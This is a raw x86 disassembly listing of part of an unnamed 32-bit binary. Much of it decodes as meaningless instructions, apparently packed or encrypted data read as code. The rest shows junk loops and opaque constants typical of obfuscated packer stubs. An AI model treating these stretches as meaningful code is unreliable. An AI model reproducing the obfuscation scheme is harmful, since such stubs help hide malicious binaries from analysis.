  40485d:	js     0x40486c
  40485f:	data16 and cl,dh
  404862:	btc    DWORD PTR [eax-0xe],ebp
  404866:	aas    
  404867:	mov    dl,al
  404869:	add    ebx,ecx
  40486b:	fwait
  40486c:	ja     0x40488e
  40486e:	add    BYTE PTR [edx-0xb],bl
  404871:	daa    
  404872:	mov    esp,0x92d283fd
  404877:	sub    ebp,ebp
  404879:	and    DWORD PTR [ebx+0x15882684],0xffffff91
  404880:	dec    ebx
  404881:	shl    dl,0x1e
  404884:	inc    edi
  404885:	sub    al,0xcb
  404887:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404888:	cwde   
  404889:	xor    edx,DWORD PTR [edx-0x28]
  40488c:	ret    0x854f
  40488f:	in     al,0x3c
  404891:	pop    edi
  404892:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404893:	loop   0x40487f
  404895:	sbb    ah,bl
  404897:	das    
  404898:	(bad)  
  404899:	sti    
  40489a:	out    0x6a,eax
  40489c:	loop   0x40485f
  40489e:	dec    ecx
  40489f:	adc    dh,bh
  4048a1:	add    al,0xa2
  4048a3:	ss adc ch,dh
  4048a6:	leave  
  4048a7:	mov    esp,0x5f4630cd
  4048ac:	or     BYTE PTR [edi+ebp*2+0xe],cl
  4048b0:	dec    ebp
  4048b1:	sub    ebp,DWORD PTR [ebx+0x47a32ce7]
  4048b7:	cmp    ch,al
  4048b9:	jo     0x404879
  4048bb:	push   esi
  4048bc:	pop    esi
  4048bd:	mov    edx,0x32cb205e
  4048c2:	inc    ebx
  4048c3:	cwde   
  4048c4:	aas    
  4048c5:	add    DWORD PTR [eax],0xffffffca
  4048c8:	je     0x404863
  4048ca:	arpl   WORD PTR [edi],sp
  4048cc:	nop
  4048cd:	pop    es
  4048ce:	jl     0x40489e
  4048d0:	int    0x86
  4048d2:	sbb    ebx,DWORD PTR ds:0xbb25d7c4
  4048d8:	les    ebx,FWORD PTR es:[edx+0x10fa86cc]
  4048df:	dec    BYTE PTR [ecx+0x2fe84a51]
  4048e5:	ret    
  4048e6:	pop    esp
  4048e7:	push   ds
  4048e8:	or     ebx,esp
  4048ea:	mov    eax,ds:0x94efe556
  4048ef:	imul   esi,DWORD PTR [edi-0x8f8615d],0x2f653d4b
  4048f9:	inc    esi
  4048fa:	(bad)  [edx-0x18]
  4048fd:	pop    edi
  4048fe:	mov    BYTE PTR [edx+0x16],ah
  404901:	(bad)  
  404902:	(bad)  
  404903:	jp     0x4048ca
  404905:	mov    ds:0x21a2d8c5,al
  40490a:	imul   esi,esi,0xfffffff0
  40490d:	jmp    0x2aa:0x997fa34e
  404914:	xor    eax,0x345c274a
  404919:	cli    
  40491a:	fisubr DWORD PTR [ecx]
  40491c:	cdq    
  40491d:	icebp  
  40491e:	stos   BYTE PTR es:[edi],al
  40491f:	cmp    al,BYTE PTR [edx+ebx*4]
  404922:	jae    0x40495e
  404924:	pop    eax
  404925:	jecxz  0x404901
  404927:	push   edi
  404928:	(bad)  
  40492a:	inc    edi
  40492b:	jl     0x404958
  40492d:	popa   
  40492e:	mov    bh,BYTE PTR [ecx]
  404930:	pop    ds
  404931:	scas   eax,DWORD PTR es:[edi]
  404932:	adc    al,0x71
  404934:	ret    0x1042
  404937:	inc    ecx
  404938:	sub    ecx,DWORD PTR [ebp+0x4a]
  40493b:	ds pop ecx
  40493d:	fbstp  TBYTE PTR ds:0x3e74d980
  404943:	push   edi
  404944:	cmp    esp,esp
  404946:	push   ebp
  404947:	mov    dl,0x49
  404949:	test   ah,dh
  40494b:	and    eax,0xe626cd36
  404950:	add    dl,al
  404952:	push   esp
  404953:	dec    eax
  404954:	clc    
  404955:	mov    ch,0x54
  404957:	scas   eax,DWORD PTR es:[edi]
  404958:	das    
  404959:	mov    dl,BYTE PTR [edx+0x7]
  40495c:	aaa    
  40495d:	add    dl,BYTE PTR [ebx]
  40495f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404960:	outs   dx,DWORD PTR ds:[esi]
  404961:	call   0x9b1c:0x5db40e9d
  404968:	out    0xd5,eax
  40496a:	xchg   ecx,eax
  40496b:	xchg   esi,eax
  40496c:	inc    edi
  40496d:	mov    edx,0xe4eab835
  404972:	outs   dx,DWORD PTR ds:[esi]
  404973:	pop    ecx
  404974:	pop    ebx
  404975:	push   edi
  404976:	sbb    ebp,DWORD PTR [eax]
  404978:	fcos   
  40497a:	inc    esi
  40497b:	loop   0x404928
  40497d:	aas    
  40497e:	pop    ebx
  40497f:	test   al,0xca
  404981:	fldenv [ebp-0x72]
  404984:	imul   ebx,DWORD PTR [esi+0x9],0xc5581014
  40498b:	jecxz  0x404945
  40498d:	push   esp
  40498e:	or     eax,0x560ceffb
  404993:	fstp   TBYTE PTR [ebx*1-0x2eedb2b3]
  40499a:	adc    DWORD PTR [ebx-0x15],esp
  40499d:	iret   
  40499e:	xchg   esp,eax
  40499f:	fnstsw WORD PTR [ecx-0x4c]
  4049a2:	mov    BYTE PTR [ebx-0x5],dh
  4049a5:	jg     0x40496b
  4049a7:	lock xchg ebp,eax
  4049a9:	in     al,0xc4
  4049ab:	xchg   esi,eax
  4049ac:	xchg   esi,eax
  4049ad:	popa   
  4049ae:	int3   
  4049af:	data16 mov al,ds:0x91e81692
  4049b5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4049b6:	clc    
  4049b7:	cs push ds
  4049b9:	imul   ebp,edx,0x9c8c3a7d
  4049bf:	cmp    cl,dl
  4049c1:	inc    esp
  4049c2:	test   DWORD PTR [esi-0x78],eax
  4049c5:	push   ds
  4049c6:	out    dx,al
  4049c7:	loope  0x404990
  4049c9:	arpl   WORD PTR [ecx],di
  4049cb:	jmp    0x4049a5
  4049cd:	mov    esp,0x594e1969
  4049d2:	mov    bh,dl
  4049d4:	or     DWORD PTR [edx+eiz*4-0x15],ecx
  4049d8:	push   edx
  4049d9:	push   0x5db8f7e3
  4049de:	sbb    DWORD PTR ds:0x31a4caf1,ecx
  4049e4:	cmp    eax,0xb14c4fde
  4049e9:	out    0x6a,eax
  4049eb:	sbb    BYTE PTR [edi+ebp*4],0x67
  4049ef:	aad    0x5d
  4049f1:	popf   
  4049f2:	fimul  DWORD PTR [ecx]
  4049f4:	adc    DWORD PTR [ebx-0x17],edi
  4049f7:	sti    
  4049f8:	test   eax,ebp
  4049fa:	mov    BYTE PTR [esi],ch
  4049fc:	je     0x4049f8
  4049fe:	out    dx,eax
  4049ff:	setnp  BYTE PTR [ecx+0x5a7bbcf3]
  404a06:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404a07:	mov    al,ds:0xbe4beff3
  404a0c:	ins    BYTE PTR es:[edi],dx
  404a0d:	mov    dh,0x8b
  404a0f:	into   
  404a10:	test   eax,0x557d005f
  404a15:	cli    
  404a16:	mov    ah,al
  404a18:	dec    BYTE PTR [eax-0x66997ba7]
  404a1e:	push   0xa47ba14b
  404a23:	es inc edi
  404a25:	rcl    DWORD PTR [edi],1
  404a27:	push   esp
  404a28:	imul   ebx,DWORD PTR [edi+0x3],0xfcd9129a
  404a2f:	rol    DWORD PTR [ebx+0x6ccd903c],1
  404a35:	push   ds
  404a36:	aam    0xea
  404a38:	adc    al,0x65
  404a3a:	(bad)  
  404a3c:	xor    edi,DWORD PTR [eax-0xe]
  404a3f:	call   0x86a4:0x7e26684a
  404a46:	fmul   DWORD PTR [edx+edx*2-0x1]
  404a4a:	inc    edx
  404a4b:	jmp    FWORD PTR [eax+0xa]
  404a4e:	mov    dh,0x7e
  404a50:	adc    al,0x92
  404a52:	inc    ebx
  404a53:	and    esp,esi
  404a55:	mov    edi,0x250d732e
  404a5a:	cld    
  404a5b:	dec    ebx
  404a5c:	push   ecx
  404a5d:	sub    al,0x18
  404a5f:	jecxz  0x4049e4
  404a61:	hlt    
  404a62:	adc    ebx,esp
  404a64:	jns    0x404aa0
  404a66:	shl    DWORD PTR [esi],1
  404a68:	sbb    ebp,DWORD PTR [esi+ebp*1-0x6]
  404a6c:	and    bl,BYTE PTR [ebx]
  404a6e:	mov    ds:0xc95b5e5f,al
  404a73:	ret    
  404a74:	push   ebp
  404a75:	mov    ebp,esp
  404a77:	sub    esp,0x2c
  404a7a:	leave  
  404a7b:	ret    0x10
  404a7e:	push   ebp
  404a7f:	mov    ebp,esp
  404a81:	sub    esp,0x44
  404a84:	adc    DWORD PTR ds:0x43383f,edi
  404a8a:	push   edi
  404a8b:	mov    eax,DWORD PTR [ebp+0xc]
  404a8e:	mov    edx,DWORD PTR ds:0x4337b7
  404a94:	and    DWORD PTR ds:0x433803,edx
  404a9a:	mov    DWORD PTR [ebp-0x10],eax
  404a9d:	adc    DWORD PTR ds:0x43372b,0x2679
  404aa7:	mov    eax,DWORD PTR [ebp+0x8]
  404aaa:	xor    ecx,DWORD PTR ds:0x43376b
  404ab0:	mov    DWORD PTR [ebp+0x8],0xf89c8531
  404ab7:	mov    DWORD PTR ds:0x43382b,0x7030
  404ac1:	mov    DWORD PTR [ebp-0x20],0xf89c8532
  404ac8:	and    DWORD PTR ds:0x4337c3,0x0
  404ad2:	mov    edi,DWORD PTR ds:0x4337c3
  404ad8:	inc    edi
  404ad9:	mov    DWORD PTR ds:0x4337c3,edi
  404adf:	cmp    DWORD PTR ds:0x4337c3,0x6
  404ae6:	jne    0x404af5
  404aec:	push   DWORD PTR [ebp-0x18]
  404aef:	call   DWORD PTR ds:0x412358
  404af5:	cmp    DWORD PTR ds:0x4337c3,0x5
  404afc:	jne    0x404b0f
  404b02:	mov    edi,DWORD PTR ds:0x4337c3
  404b08:	inc    edi
  404b09:	mov    DWORD PTR ds:0x4337c3,edi
  404b0f:	cmp    DWORD PTR ds:0x4337c3,0x14
  404b16:	jb     0x404ad2
  404b1c:	jmp    0x404e76
  404b21:	push   ecx
  404b22:	mov    esi,0xf1913591
  404b27:	jno    0x404b83
  404b29:	ins    DWORD PTR es:[edi],dx
  404b2a:	inc    ebp
  404b2b:	fild   WORD PTR [ecx-0x701295d7]
  404b31:	xor    ebp,DWORD PTR ds:0x7d337e7e
  404b37:	jle    0x404bb7
  404b39:	fbld   TBYTE PTR [ebp+0x5c]
  404b3c:	mov    esp,0x963b89dc
  404b41:	xchg   edx,eax
  404b42:	inc    esi
  404b43:	mov    BYTE PTR [edi+ebx*4],cl
  404b46:	scas   al,BYTE PTR es:[edi]
  404b47:	test   DWORD PTR [ecx-0x6632d4d1],0x84989c2d
  404b51:	ss xchg edi,eax
  404b53:	xor    al,0x52
  404b55:	shr    dl,cl
  404b57:	mov    edx,0x46f22ce3
  404b5c:	les    ebp,FWORD PTR [eax+0x767f38b6]
  404b62:	rep lods eax,DWORD PTR ds:[esi]
  404b64:	repnz lods al,BYTE PTR ds:[esi]
  404b66:	pop    eax
  404b67:	ins    DWORD PTR es:[edi],dx
  404b68:	jnp    0x404b1d
  404b6a:	ficom  DWORD PTR [eax]
  404b6c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404b6d:	jmp    0x69c4e2cd
  404b72:	pop    edx
  404b73:	add    DWORD PTR [ecx-0x101c518f],esp
  404b79:	(bad)  
  404b7a:	pushf  
  404b7b:	int3   
  404b7c:	push   0x89f61c59
  404b81:	dec    edx
  404b82:	pop    edi
  404b83:	sub    BYTE PTR [ebx-0x2c],cl
  404b86:	lea    esi,[edi]
  404b88:	add    BYTE PTR [eax+0x6f],al
  404b8b:	jo     0x404c09
  404b8d:	mov    ds:0xa4d09672,eax
  404b92:	mov    ?,WORD PTR [edx+0x7]
  404b95:	sub    BYTE PTR [ebp-0x2cad7548],cl
  404b9b:	dec    edi
  404b9c:	bound  esp,QWORD PTR [ebp-0x7ae8b90e]
  404ba2:	ins    BYTE PTR es:[edi],dx
  404ba3:	xor    edi,DWORD PTR [edi-0x157aaf0d]
  404ba9:	xor    ecx,esi
  404bab:	les    ebx,FWORD PTR [edi]
  404bad:	sbb    bh,0x9f
  404bb0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404bb1:	dec    eax
  404bb2:	inc    esi
  404bb3:	adc    eax,0xd605f586
  404bb8:	call   0xebd:0xfd6275b1
  404bbf:	or     DWORD PTR [ecx-0x1a],edi
  404bc2:	call   0x841e:0x5545849
  404bc9:	mov    ah,BYTE PTR [ebx+0x16c1bf87]
  404bcf:	xchg   edi,eax
  404bd0:	fsubr  DWORD PTR [eax]
  404bd2:	ja     0x404c2c
  404bd4:	mov    ebp,0xa6f2dcf7
  404bd9:	in     eax,0x4b
  404bdb:	inc    edi
  404bdc:	mov    edx,0x37ec191d
  404be1:	adc    al,0xb8
  404be3:	pop    ss
  404be4:	pop    eax
  404be5:	mov    DWORD PTR [ebx+0xba9fe0e],eax
  404beb:	dec    esi
  404bec:	jecxz  0x404c07
  404bee:	in     eax,0x59
  404bf0:	cmp    BYTE PTR [ebx],dh
  404bf2:	mov    ds:0x1d25e9e1,eax
  404bf7:	pop    eax
  404bf8:	mov    dl,0xaf
  404bfa:	xchg   ecx,eax
  404bfb:	xchg   eax,ebp
  404bfd:	imul   esp,ebx,0xffffffe9
  404c00:	and    eax,DWORD PTR [ecx+0x1948b831]
  404c06:	cmp    al,0xa8
  404c08:	mov    ebx,0x3176cd9b
  404c0d:	imul   ebx,DWORD PTR [ebx-0x3f],0x3e
  404c11:	lods   eax,DWORD PTR ds:[esi]
  404c12:	daa    
  404c13:	fidivr WORD PTR [ecx]
  404c15:	xor    bh,BYTE PTR ds:0xf55a4744
  404c1b:	(bad)  
  404c1c:	stc    
  404c1d:	and    edx,esp
  404c1f:	jns    0x404bda
  404c21:	in     al,dx
  404c22:	mov    ds:0xe459a49c,eax
  404c27:	inc    ecx
  404c28:	jno    0x404c45
  404c2a:	pusha  
  404c2b:	dec    esp
  404c2c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404c2d:	imul   edi,DWORD PTR [esi],0xaed652f5
  404c33:	add    BYTE PTR [edx-0x40feb3ee],0x3c
  404c3a:	mov    edx,0x5412652e
  404c3f:	retf   
  404c40:	add    eax,0x80bdaea6
  404c45:	adc    BYTE PTR [edx+0x64],ch
  404c48:	sub    DWORD PTR [ebp-0x56],0xa5788da7
  404c4f:	inc    edi
  404c50:	aad    0x64
  404c52:	jno    0x404c5f
  404c54:	fprem  
  404c56:	(bad)  
  404c57:	call   DWORD PTR [ebx]
  404c59:	jge    0x404ccb
  404c5b:	sub    eax,0xccc18696
  404c60:	iret   
  404c61:	imul   BYTE PTR [eax+0x7b6c43e8]
  404c67:	jge    0x404ccc
  404c69:	(bad)  
  404c6a:	cmp    ah,BYTE PTR [eax]
  404c6c:	in     al,0xb6
  404c6e:	pop    esi
  404c6f:	ror    BYTE PTR [eax-0x12],1
  404c72:	pop    esp
  404c73:	push   es
  404c74:	jmp    0x283b:0xb0e63413
  404c7b:	jmp    0x404c4f
  404c7d:	ror    DWORD PTR [ebx-0x1],0x86
  404c81:	xchg   edi,eax
  404c82:	and    bl,BYTE PTR ds:0x35600944
  404c88:	inc    esp
  404c89:	cmc    
  404c8a:	pop    edx
  404c8b:	mov    eax,eax
  404c8d:	push   0xf641eb4c
  404c92:	jp     0x404cc2
  404c94:	(bad)  
  404c95:	jno    0x404c38
  404c97:	lock stc 
  404c99:	ins    BYTE PTR es:[edi],dx
  404c9a:	mov    ecx,DWORD PTR [ebx+0x67]
  404c9d:	cld    
  404c9e:	pushf  
  404c9f:	fild   WORD PTR [si+0x9]
  404ca3:	pop    es
  404ca4:	mov    edx,DWORD PTR [ebx+0x4eeb9baf]
  404caa:	pop    edx
  404cab:	mov    edx,gs
  404cad:	add    eax,DWORD PTR ds:0x938a9062
  404cb3:	adc    DWORD PTR [ebx],ebx
  404cb5:	pushf  
  404cb6:	ret    
  404cb7:	test   BYTE PTR [ebp-0x54],dl
  404cba:	add    BYTE PTR [eax+0x7c274f2e],ah
  404cc0:	stos   DWORD PTR es:[edi],eax
  404cc1:	dec    ebp
  404cc2:	jnp    0x404cea
  404cc4:	and    esi,eax
  404cc6:	and    cl,BYTE PTR [ebx]
  404cc8:	dec    edx
  404cc9:	mov    ch,BYTE PTR [edx+0x64]
  404ccc:	retf   
  404ccd:	adc    cl,al
  404ccf:	lods   eax,DWORD PTR ds:[esi]
  404cd0:	mov    WORD PTR [edx+0x74],ss
  404cd3:	(bad)  
  404cd4:	fs mov edx,0xd9741d56
  404cda:	retf   
  404cdb:	outs   dx,DWORD PTR ds:[esi]
  404cdc:	addr16 mov bl,0x5e
  404cdf:	adc    DWORD PTR [edx],0x77821e61
  404ce5:	pop    esp
  404ce6:	pextrw esp,mm0,0x8
  404cea:	mov    bl,0xb3
  404cec:	call   0xc8f66eb2
  404cf1:	jle    0x404d66
  404cf3:	call   0xd756:0x3ff331cd
  404cfa:	lea    esi,[ebp-0x742079fc]
  404d00:	scas   al,BYTE PTR es:[edi]
  404d01:	fnstcw WORD PTR [esi+0x6d]
  404d04:	pop    ds
  404d05:	mov    edx,0xff2eba6c
  404d0a:	(bad)  
  404d0b:	icebp  
  404d0c:	dec    ecx
  404d0d:	mov    ebp,0x5fd373d4
  404d12:	and    dh,BYTE PTR [edi]
  404d14:	or     dl,BYTE PTR [ecx+0x790d7a52]
  404d1a:	jg     0x404cdd
  404d1c:	loope  0x404d99
  404d1e:	dec    ebx
  404d1f:	cmp    eax,0xf045828c
  404d24:	dec    edi
  404d25:	ret    0xafa6
  404d28:	daa    
  404d29:	jmp    0x646c:0x604bdfe5
  404d30:	dec    edx
  404d31:	les    eax,FWORD PTR [edi-0x48]
  404d34:	aaa    
  404d35:	mov    dl,0x8e
  404d37:	in     eax,dx
  404d38:	sbb    DWORD PTR [ebp+0x6d],esi
  404d3b:	jmp    0xc0df:0xd35c07f4
  404d42:	jbe    0x404d49
  404d44:	cwde   
  404d45:	lahf   
  404d46:	(bad)  
  404d48:	pop    esp
  404d49:	add    ch,BYTE PTR [edi-0x62]
  404d4c:	mov    eax,ds:0x6b0f7eda
  404d51:	sbb    DWORD PTR [edi-0x21],ebx
  404d54:	test   BYTE PTR [ebx-0xd061d91],ch
  404d5a:	sub    esi,ebp
  404d5c:	sahf   
  404d5d:	(bad)  
  404d5e:	jecxz  0x404d74
  404d60:	test   DWORD PTR [esi],edx
  404d62:	or     DWORD PTR [ebp+0x7b],ecx
  404d65:	or     DWORD PTR [ecx+0x3b215964],edx
  404d6b:	dec    ebp
  404d6c:	mov    ss,WORD PTR [edi+0x74]
  404d6f:	mov    bh,0xdd
  404d71:	add    cl,BYTE PTR [edx+0x3c08c24d]
  404d77:	push   cs
  404d78:	sti    
  404d79:	jg     0x404d88
  404d7b:	jns    0x404d7d
  404d7d:	shl    esp,1
  404d7f:	pop    eax
  404d80:	mov    DWORD PTR [esp+ebx*8-0x4a],esp
  404d84:	adc    al,0x58
  404d86:	(bad)  
  404d87:	and    eax,DWORD PTR [esi+0x4c]
  404d8a:	lock outs dx,BYTE PTR ds:[esi]
  404d8c:	mov    ecx,0xb2ad5898
  404d91:	fwait
  404d92:	mov    bl,0x62
  404d94:	adc    ecx,esi
  404d96:	sti    
  404d97:	popa   
  404d98:	(bad)  
  404d99:	jns    0x404dea
  404d9b:	into   
  404d9c:	xchg   edx,eax
  404d9d:	pop    edi
  404d9e:	jle    0x404e09
  404da0:	sub    BYTE PTR [esi-0x1],cl
  404da3:	inc    ebp
  404da4:	pop    ecx
  404da5:	mov    ebp,0x2c6e8fd1
  404daa:	dec    esi
  404dac:	hlt    
  404dad:	adc    bl,BYTE PTR [ecx]
  404daf:	loopne 0x404da6
  404db1:	adc    al,0xc3
  404db3:	in     eax,dx
  404db4:	and    eax,0x4d826c5b
  404db9:	and    ecx,DWORD PTR [ecx-0x19]
  404dbc:	popf   
  404dbd:	lahf   
  404dbe:	cmp    edx,DWORD PTR [ecx+eiz*8+0x4d]
  404dc2:	dec    DWORD PTR [ebp-0x3d]
  404dc5:	add    cl,ah
  404dc7:	or     bl,BYTE PTR [eax+0x4]
  404dca:	js     0x404d58
  404dcc:	sar    DWORD PTR [edi+eax*1+0x7e],cl
  404dd0:	mov    dl,0x31
  404dd2:	and    BYTE PTR ds:0xe0135814,bh
  404dd8:	mov    bl,0x2e
  404dda:	pop    edx
  404ddb:	call   0x77a4:0x5eba5b62
  404de2:	dec    eax
  404de3:	call   0x8e90:0x9c251516
  404dea:	cs daa 
  404dec:	in     al,dx
  404ded:	inc    ebx
  404dee:	pushf  
  404def:	sub    eax,0x4d57688f
  404df4:	imul   esi,DWORD PTR [ecx],0x2a
  404df7:	mov    ?,WORD PTR [ebx+0x30e0ee88]
  404dfd:	call   0x7c65:0x3dfef763
  404e04:	cmp    al,0xe
  404e06:	lds    ebx,FWORD PTR [edi-0x4886de83]
  404e0c:	or     cl,BYTE PTR [ebx+0x6cc57542]
  404e12:	push   es
  404e13:	lds    esp,FWORD PTR [eax+0x1dd8af0f]
  404e19:	jle    0x404d9f
  404e1b:	(bad)  
  404e1c:	(bad)  
  404e1e:	cwde   
  404e1f:	pusha  
  404e20:	pop    edi
  404e21:	sub    eax,DWORD PTR [edx+ebx*4+0x22]
  404e25:	xchg   DWORD PTR [edx+ebp*8-0x691d8410],edi
  404e2c:	(bad)  
  404e2d:	(bad)  
  404e2e:	pop    esp
  404e2f:	das    
  404e30:	arpl   WORD PTR [ebx+edx*1+0x36e83349],cx
  404e37:	add    cl,BYTE PTR [ecx-0x22c23429]
  404e3d:	cmp    ebx,DWORD PTR [edi+ebp*1-0xf]
  404e41:	dec    ecx
  404e42:	lock and ecx,DWORD PTR [edi]
  404e45:	jne    0x404e7c
  404e47:	push   edx
  404e48:	test   eax,0x23aa449b
  404e4d:	fdivr  DWORD PTR [edi]
  404e4f:	clc    
  404e50:	pop    es
  404e51:	and    ch,bh
  404e53:	inc    ebx
  404e54:	lahf   
  404e55:	aam    0x2d
  404e57:	mov    ds:0x54e9dbbe,eax
  404e5c:	int    0xef
  404e5e:	mov    ah,0x84
  404e60:	pcmpeqb mm0,QWORD PTR [ecx-0x2a]
  404e64:	ins    DWORD PTR es:[edi],dx
  404e65:	jae    0x404e5e
  404e67:	test   BYTE PTR [edx-0x3a],ah
  404e6a:	dec    ebp
  404e6b:	ins    DWORD PTR es:[edi],dx
  404e6c:	add    ch,dh
  404e6e:	and    ah,BYTE PTR [edx]
  404e70:	mov    ah,0x59
  404e72:	inc    esp
  404e73:	shl    DWORD PTR ds:0x8558b8c,1
  404e79:	adc    ecx,0x7359
  404e7f:	mov    DWORD PTR [ebp-0x40],eax
  404e82:	mov    eax,0x7510854
  404e87:	xor    edx,eax
  404e89:	adc    DWORD PTR ds:0x43371b,0x3221
  404e93:	mov    ecx,0x32729b
  404e98:	mov    edi,DWORD PTR ds:0x4337e7
  404e9e:	adc    DWORD PTR ds:0x43377f,edi
  404ea4:	add    edx,ecx
  404ea6:	neg    edi
  404ea8:	mov    DWORD PTR [ebp-0x8],edx
  404eab:	mov    DWORD PTR ds:0x4337eb,0x10
  404eb5:	cmp    DWORD PTR ds:0x4337eb,0x0
  404ebc:	je     0x404f14
  404ec2:	cmp    DWORD PTR ds:0x4337eb,0x9
  404ec9:	jne    0x404ee2
  404ecf:	push   0x6f04
  404ed4:	push   0x5d47
  404ed9:	push   DWORD PTR [ebp-0x1c]
  404edc:	call   DWORD PTR ds:0x41235c
  404ee2:	cmp    DWORD PTR ds:0x4337eb,0xa
  404ee9:	jne    0x404efc
  404eef:	mov    edi,DWORD PTR ds:0x4337eb
  404ef5:	dec    edi
  404ef6:	mov    DWORD PTR ds:0x4337eb,edi
  404efc:	mov    edi,DWORD PTR ds:0x4337eb
  404f02:	dec    edi
  404f03:	mov    DWORD PTR ds:0x4337eb,edi
  404f09:	jmp    0x404eb5
  404f0e:	and    DWORD PTR ds:0x43383f,ecx
  404f14:	mov    edx,DWORD PTR [ebp+0x8]
  404f17:	sbb    edi,DWORD PTR ds:0x4337eb
  404f1d:	xor    edx,eax
  404f1f:	sbb    edi,DWORD PTR ds:0x4337bf
  404f25:	add    edx,ecx
  404f27:	and    DWORD PTR ds:0x43383b,0x0
  404f31:	xor    edi,edi
  404f33:	add    edi,DWORD PTR ds:0x43383b
  404f39:	inc    edi
  404f3a:	mov    DWORD PTR ds:0x43383b,edi
  404f40:	cmp    DWORD PTR ds:0x43383b,0xc
  404f47:	jne    0x404f58
  404f4d:	push   0x3fd8
  404f52:	call   DWORD PTR ds:0x412000
  404f58:	cmp    DWORD PTR ds:0x43383b,0xb
  404f5f:	jne    0x404f72
  404f65:	mov    edi,DWORD PTR ds:0x43383b
  404f6b:	inc    edi
  404f6c:	mov    DWORD PTR ds:0x43383b,edi
  404f72:	cmp    DWORD PTR ds:0x43383b,0x17
  404f79:	jb     0x404f31
  404f7f:	mov    DWORD PTR [ebp+0xc],edx
  404f82:	mov    DWORD PTR ds:0x433737,0x5f27
  404f8c:	mov    DWORD PTR [ebp-0x4],0xf89c85d1
  404f93:	xor    DWORD PTR ds:0x433767,edi
  404f99:	mov    DWORD PTR [ebp-0x28],0xf89c8533
  404fa0:	mov    DWORD PTR [ebp-0x2c],0xf89c853c
  404fa7:	sbb    DWORD PTR ds:0x4337ef,edi
  404fad:	mov    DWORD PTR [ebp-0x30],0xf89c853d
  404fb4:	adc    DWORD PTR ds:0x43370f,ecx
  404fba:	mov    DWORD PTR [ebp-0x34],0xf89c853e
  404fc1:	movzx  edi,WORD PTR ds:0x433767
  404fc8:	and    DWORD PTR ds:0x433713,edi
  404fce:	mov    DWORD PTR [ebp-0x38],0xf89c853f
  404fd5:	dec    edx
  404fd6:	mov    DWORD PTR [ebp-0x3c],0xf89c8538
  404fdd:	mov    edx,DWORD PTR [ebp+0x8]
  404fe0:	add    DWORD PTR ds:0x4337e7,ebx
  404fe6:	xor    edx,eax
  404fe8:	add    edi,0x469e
  404fee:	mov    edi,DWORD PTR [ebp-0x10]
  404ff1:	add    edx,ecx
  404ff3:	cmp    edi,edx
  404ff5:	mov    DWORD PTR ds:0x43382f,0x53a
  404fff:	je     0x40685f
  405005:	mov    DWORD PTR ds:0x433837,0x2c13
  40500f:	push   ebx
  405010:	mov    DWORD PTR ds:0x4337ef,0x2429
  40501a:	jmp    0x40683a
  40501f:	mov    edx,DWORD PTR [ebp-0x8]
  405022:	and    DWORD PTR ds:0x433727,0x0
  40502c:	mov    edi,DWORD PTR ds:0x433727
  405032:	inc    edi
  405033:	mov    DWORD PTR ds:0x433727,edi
  405039:	cmp    DWORD PTR ds:0x433727,0x6
  405040:	jne    0x40505d
  405046:	push   DWORD PTR [ebp-0x14]
  405049:	push   DWORD PTR [ebp-0x10]
  40504c:	push   DWORD PTR [ebp-0xc]
  40504f:	push   DWORD PTR [ebp-0x18]
  405052:	push   0x82f7
  405057:	call   DWORD PTR ds:0x41236c
  40505d:	cmp    DWORD PTR ds:0x433727,0x5
  405064:	jne    0x405079
  40506a:	xor    edi,edi
  40506c:	xor    edi,DWORD PTR ds:0x433727
  405072:	inc    edi
  405073:	mov    DWORD PTR ds:0x433727,edi
  405079:	cmp    DWORD PTR ds:0x433727,0x17
  405080:	jb     0x40502c
  405086:	xor    edi,edi
  405088:	add    edi,DWORD PTR ds:0x4337ff
  40508e:	add    DWORD PTR ds:0x4337bb,edi
  405094:	mov    edi,DWORD PTR [ebp-0x10]
  405097:	sub    edi,edx
  405099:	mov    edx,DWORD PTR [ebp-0x4]
  40509c:	xor    edx,eax
  40509e:	add    edx,ecx
  4050a0:	mov    DWORD PTR ds:0x4337eb,0x78fa
  4050aa:	cmp    edi,edx
  4050ac:	mov    DWORD PTR ds:0x43383b,0x49ec
  4050b6:	jb     0x40685e
  4050bc:	mov    edx,DWORD PTR [ebp-0x28]
  4050bf:	mov    edi,DWORD PTR [ebp-0x4]
  4050c2:	xor    edx,eax
  4050c4:	inc    DWORD PTR ds:0x43383b
  4050ca:	xor    edi,eax
  4050cc:	not    DWORD PTR ds:0x4337fb
  4050d2:	add    edi,ecx
  4050d4:	add    edx,ecx
  4050d6:	adc    ebx,0x69d8
  4050dc:	imul   edx,edi
  4050df:	mov    edi,DWORD PTR [ebp-0x8]
  4050e2:	mov    ebx,DWORD PTR [ebp-0x10]
  4050e5:	sbb    DWORD PTR ds:0x433727,0x4337b7
  4050ef:	sub    ebx,edi
  4050f1:	mov    DWORD PTR ds:0x43371f,0x4726
  4050fb:	cmp    ebx,edx
  4050fd:	mov    DWORD PTR ds:0x4337eb,0x2e42
  405107:	ja     0x4054d4
  40510d:	and    DWORD PTR ds:0x4337ff,0x0
  405117:	jmp    0x40512b
  40511c:	xor    edx,edx
  40511e:	add    edx,DWORD PTR ds:0x4337ff
  405124:	inc    edx
  405125:	mov    DWORD PTR ds:0x4337ff,edx
  40512b:	cmp    DWORD PTR ds:0x4337ff,0x17
  405132:	jae    0x40515a
  405138:	cmp    DWORD PTR ds:0x4337ff,0x18
  40513f:	jne    0x405155
  405145:	push   0x19d0
  40514a:	push   0x338d
  40514f:	call   DWORD PTR ds:0x412004
  405155:	jmp    0x40511c
  40515a:	mov    edx,DWORD PTR [ebp-0x4]
  40515d:	sbb    DWORD PTR ds:0x4337eb,0x43376f
  405167:	xor    edx,eax
  405169:	xor    DWORD PTR ds:0x4337e7,0x55d1
  405173:	jmp    0x4054cd
  405178:	cdq    
  405179:	jp     0x4051e8
  40517b:	pushf  
  40517c:	ins    DWORD PTR es:[edi],dx
  40517d:	imul   ebp,DWORD PTR [ecx+0x7b],0x879a2b7f
  405184:	cmp    eax,0xf4907399
  405189:	sub    BYTE PTR [esi+0x7e],bh
  40518c:	xor    edi,DWORD PTR [ebp+0x7e]
  40518f:	jle    0x4051e6
  405191:	and    ebp,DWORD PTR [edi-0x76]
